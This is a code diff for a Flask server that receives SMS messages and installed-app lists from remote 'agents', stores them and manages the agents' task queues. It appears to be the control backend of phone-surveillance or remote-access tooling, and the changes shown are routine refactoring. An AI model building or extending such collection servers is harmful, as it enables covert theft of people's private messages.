@@ -23,15 +23,13 @@ def index():
 @app.route("/sms")
 def viewSms():
     sql = "SELECT * FROM sms"
-    data_rows = get_data_sql(sql)
-    columns = ["id", "address", "body", "formatted_date", "type"]
+    data_rows, columns = get_data_sql(sql)
     return render_template("sms.html", title="sms", columns=columns, data=data_rows)
 
 @app.route("/app")
 def viewApp():
     sql = "SELECT id, package, sourceDir, launchActivity FROM app"
-    data_rows = get_data_sql(sql)
-    columns = ["id", "package", "sourceDir", "launchActivity"]
+    data_rows, columns = get_data_sql(sql)
     return render_template("app.html", title="Installed apps", columns=columns, data=data_rows)
 
 #############
@@ -105,6 +103,7 @@ def receiveResult(id):
 
 def handle_sms(content, id):
     print(f"Received SMS data: {content}\n\n")
+    clearAgentTasks(id)
     for json_data in content:
         address = json_data.get("address", "")
         body = json_data.get("body", "")
@@ -116,12 +115,13 @@ def handle_sms(content, id):
         args = (id, address, body, formatted_date, messageType)
         writeToDatabase(sql, args)
                
-    clearAgentTasks(id)
+    
 
     return ("Success", 200)
 
 def handle_app(content, id):
     print(f"Received app data: {content}\n\n")
+    clearAgentTasks(id)
     for json_data in content:
         package = json_data.get("package", "")
         sourceDir = json_data.get("sourceDir", "")
@@ -132,7 +132,7 @@ def handle_app(content, id):
         args = (id, package, sourceDir, launchActivity)
         writeToDatabase(sql, args)
     
-    clearAgentTasks(id)
+    
     return ("Success", 200)
 
 ####################
@@ -179,9 +179,11 @@ def get_db_connection():
 
 def get_data_sql(sql):
     conn = get_db_connection()
-    rows = conn.execute(sql).fetchall()
+    cursor = conn.execute(sql)
+    rows = cursor.fetchall()
+    names = [description[0] for description in cursor.description]
     conn.close()
-    return rows
+    return rows, names
 
 def init_database():
     print("Creating database")
@@ -209,6 +211,7 @@ def run_server():
     logging.basicConfig(filename='log',level=logging.DEBUG)
 
     app.run(host='0.0.0.0', port=443, ssl_context=('keys/cert.pem', 'keys/key2.pem'))
+    # app.run(host='0.0.0.0', port=80)
 
 if __name__ == "__main__":
     run_server()
